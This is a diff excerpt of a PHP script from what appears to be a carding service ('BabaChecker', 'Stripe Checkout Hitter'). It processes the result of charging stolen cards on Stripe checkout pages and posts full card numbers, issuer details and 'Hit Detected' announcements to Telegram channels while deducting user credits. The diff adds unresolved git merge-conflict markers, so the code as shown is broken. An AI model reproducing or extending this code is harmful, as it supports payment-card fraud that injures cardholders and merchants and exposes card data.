@@ -371,7 +371,11 @@ if ($status === 'charge') {
     $fullResult = "<b>#StripeCOHitter</b>\n━━━━━━━━━━━\n[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n[ﾒ] <b>Status ➜</b> Charged 🔥\n[ﾒ] <b>Response ➜</b> {$msg}\n━━━━━━━━━━━\n[ﾒ] <b>Merchant ➜</b> {$merchant}\n[ﾒ] <b>Price ➜</b> {$price}\n[ﾒ] <b>Product ➜</b> {$productName}\n[ﾒ] <b>Receipt ➜</b> {$receipt}\n━━━━━━━━━━━\n[ﾒ] <b>Info ➜</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n[ﾒ] <b>Bank ➜</b> {$binInfo['issuer']}\n[ﾒ] <b>Country ➜</b> {$binInfo['country_info']}\n━━━━━━━━━━━\n[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n[ㇺ] <b>Dev ➜</b> babachecker";
     if (!empty($telegramId)) {sendTelegramMessage($botToken, $telegramId, $fullResult);}
     sendTelegramMessage($botToken, '-1002890276135', $fullResult);
+<<<<<<< HEAD
     $publicMessage = "<b>Hit Detected ✅</b>\n━━━━━━━━\n<b>User ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n<b>Status ➜</b> <b>Charged 🔥</b>\n<b>Response ➜</b> {$msg} {$price} 🎉\n<b>Gateway ➜</b> Stripe Checkout Hitter\n━━━━━━━━━━━\n<b>Hit From ➜</b> <a href=\"https://ethnix.net\">BabaChecker</a>";
+=======
+    $publicMessage = "<b>Hit Detected ✅</b>\n━━━━━━━━\n<b>User ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n<b>Status ➜</b> <b>Charged 🔥</b>\n<b>Response ➜</b> {$msg} {$price} 🎉\n<b>Gateway ➜</b> Stripe Checkout Hitter\n━━━━━━━━━━━\n<b>Hit From ➜</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
+>>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
     sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
     echo json_encode(['status' => 'charge','Response' => $msg,'Gateway' => 'Stripe Checkout Hitter','cc' => $cc1,'credits' => $newCredits,'merchant' => $merchant,'price' => $price,'productName' => $productName,'receipt' => $receipt,'brand' => $binInfo['brand'],'card_type' => $binInfo['card_type'],'level' => $binInfo['level'],'issuer' => $binInfo['issuer'],'country_info' => $binInfo['country_info']]);
     exit;
@@ -386,4 +390,8 @@ if ($status === 'charge') {
 $newCredits = updateCredits($pdo, $uid, 0, $currentCredits);
 echo json_encode(['status' => 'dead','Response' => $msg,'Gateway' => 'Stripe Checkout Hitter','cc' => $cc1,'credits' => $newCredits,'merchant' => $merchant,'price' => $price,'productName' => $productName,'receipt' => $receipt,'brand' => $binInfo['brand'],'card_type' => $binInfo['card_type'],'level' => $binInfo['level'],'issuer' => $binInfo['issuer'],'country_info' => $binInfo['country_info']]);
 exit;
+<<<<<<< HEAD
 ?>
+=======
+?>
+>>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
